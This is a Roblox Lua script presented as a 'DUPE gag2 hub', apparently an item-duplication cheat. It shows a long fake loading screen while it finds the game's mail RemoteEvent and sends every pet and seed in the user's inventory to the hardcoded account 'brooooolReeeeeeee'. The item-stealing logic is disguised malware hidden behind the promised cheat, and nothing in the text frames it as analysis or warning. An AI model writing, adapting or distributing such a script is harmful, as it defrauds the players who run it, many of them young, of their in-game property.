erafox:

```lua
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.Parent = gui

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, 0, 1, 0)
text.BackgroundTransparency = 1
text.Text = "DUPE gag2 hub"
text.TextColor3 = Color3.new(1,1,1)
text.TextScaled = true
text.Font = Enum.Font.GothamBold
text.Parent = gui

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0.6, 0, 0.03, 0)
bar.Position = UDim2.new(0.2, 0, 0.6, 0)
bar.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
bar.Parent = gui

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.new(0.8,0,0)
fill.Parent = bar

local pct = Instance.new("TextLabel")
pct.Size = UDim2.new(1, 0, 0.05, 0)
pct.Position = UDim2.new(0, 0, 0.64, 0)
pct.BackgroundTransparency = 1
pct.Text = "Loading... 0%"
pct.TextColor3 = Color3.new(0.5,0.5,0.5)
pct.TextScaled = true
pct.Font = Enum.Font.Gotham
pct.Parent = gui

for i = 1, 100 do
    fill.Size = UDim2.new(i/100, 0, 1, 0)
    pct.Text = "Loading... " .. i .. "%"
    task.wait(5)
end

local rs = game:GetService("ReplicatedStorage")
local mail = nil
for _, v in pairs(rs:GetDescendants()) do
    if v:IsA("RemoteEvent") and string.lower(v.Name):find("mail") then
        mail = v
        break
    end
end

if mail then
    local inv = player:FindFirstChild("Inventory") or player:FindFirstChild("Data") or player:FindFirstChild("Items")
    if inv then
        local pets = inv:FindFirstChild("Pets")
        local seeds = inv:FindFirstChild("Seeds")
        
        local function send(item, type)
            mail:FireServer("brooooolReeeeeeee", item, type, 1)
        end
        
        if pets then
            for _, pet in pairs(pets:GetChildren()) do
                local id = pet:GetAttribute("ItemID") or pet.Name
                send(id, "Pet")
                task.wait(0.3)
            end
        end
        
        if seeds then
            for _, seed in pairs(seeds:GetChildren()) do
                local id = seed:GetAttribute("ItemID") or seed.Name
                send(id, "Seed")
                task.wait(0.3)
            end
        end
    end
end

pct.Text = "Complete!"
pct.TextColor3 = Color3.new(0,1,0)
task.wait(2)
gui:Destroy()
```
